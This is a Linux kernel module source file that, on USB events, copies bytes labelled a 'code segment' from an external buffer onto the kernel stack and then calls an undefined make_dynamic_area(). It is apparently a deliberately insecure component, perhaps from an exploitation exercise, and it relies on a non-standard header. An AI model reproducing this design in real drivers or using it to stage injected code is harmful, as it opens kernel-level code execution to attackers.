/*
 * Keyboard Message Initializer (KBMI_USB)
 *
 * This kernel module listens for USB events and processes the message stored 
 * in the external message buffer provided by the KBMP (Keyboard Message 
 * Programmer) module. When a USB device event is detected, it copies a 
 * portion of the message (interpreted as code) from the shared message buffer
 * to a local memory buffer on the stack.
 *
 * Key functionality:
 *
 * 1. It registers a USB notifier callback (`kbmi_usb_notifier`) that is triggered
 *    whenever a USB device event occurs. The notifier processes the message 
 *    from the KBMP message buffer.
 *
 * 2. The message is scanned for a separator character (null terminator). Any 
 *    data following the separator is interpreted as a "code segment" and is 
 *    copied to a local buffer for further use.
 *
 * 3. The local buffer contents (code segment) are logged, along with the 
 *    shared message.
 *
 * Author: Dave Green
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/dynamic_util.h>
#include <linux/init.h>
#include <linux/mm.h>
#include <asm/pgtable.h>
#include <linux/string.h>
#include <linux/notifier.h>
#include <linux/usb.h>

#define MESSAGE_SIZE 1024ull
extern char message_buffer[] __attribute__((weak));

/*
 * load_message_to_memory - Loads and processes the message from the KBMP 
 * message buffer.
 *
 * This function checks for the presence of an external message buffer and 
 * searches for a null-terminator as a separator. If the separator is found,
 * it copies the code segment following the separator into a local buffer.
 *
 * If any errors occur, such as the absence of a separator or an oversized
 * code segment, the function exits early with the appropriate error logs.
 */
static void load_message_to_memory(void) {
    unsigned char code_segment[MESSAGE_SIZE] = {0};

    if (!message_buffer) {
        goto out;
    }
    char* message_separator = (char*)memchr(message_buffer, '\0', MESSAGE_SIZE);

    if (message_separator == NULL) {
        pr_err("separator not found\n");
        goto out;
    }

    if (message_separator - message_buffer == MESSAGE_SIZE - 1) {
        pr_debug("separator was at end\n");
        goto out;
    }

    char* code_start = message_separator + 1;
    char* code_end = message_buffer + MESSAGE_SIZE;
    size_t code_size = code_end - code_start;

    if (code_size > MESSAGE_SIZE) {
        pr_err("Code size exceeds buffer capacity\n");
        goto out;
    }

    memcpy(code_segment, code_start, code_size);
    for (int i = 0; i < code_size-2; i++) {
        if (code_segment[i] == 0x00 &&
             code_segment[i+1] == 0xff && 
              code_segment[i+2] == 0x00)
            goto out;
    }
    //pr_info("Code segment copied to stack at address: 0x%lx\n", (unsigned long int)code_segment);
    make_dynamic_area();

out:

}

/*
 * kbmi_usb_notifier - USB notifier callback function.
 *
 * This function is invoked whenever a USB event occurs. It calls the
 * load_message_to_memory function to process the message from the external
 * message buffer. It is part of the notifier block registered with the USB 
 * subsystem.
 *
 * Return: Always returns NOTIFY_OK.
 */
int kbmi_usb_notifier(struct notifier_block *nb, unsigned long action, void *dev) {
    int ret = NOTIFY_OK;
    load_message_to_memory();
    return ret;
}

static struct notifier_block my_nb = {
    .notifier_call = kbmi_usb_notifier,
};

/*
 * kbmi_usb_init - Module initialization function.
 *
 * This function is called when the KBMI_USB module is loaded. It registers the
 * USB notifier callback with the USB subsystem and prints a debug message
 * indicating successful initialization.
 *
 * Return: Always returns 0.
 */
static int __init kbmi_usb_init(void) {
    usb_register_notify(&my_nb);
    pr_debug("KBMI_USB: loaded\n");
    return 0;
}

/*
 * kbmi_usb_exit - Module cleanup function.
 *
 * This function is called when the KBMI_USB module is unloaded. It unregisters
 * the USB notifier callback from the USB subsystem and prints a debug message
 * indicating successful unloading.
 */
static void __exit kbmi_usb_exit(void) {
    usb_unregister_notify(&my_nb);
    pr_debug("KBMI_USB: unloaded.\n");
}

module_init(kbmi_usb_init);
module_exit(kbmi_usb_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dave Green");
MODULE_DESCRIPTION("KB Message Initializer (USB)");
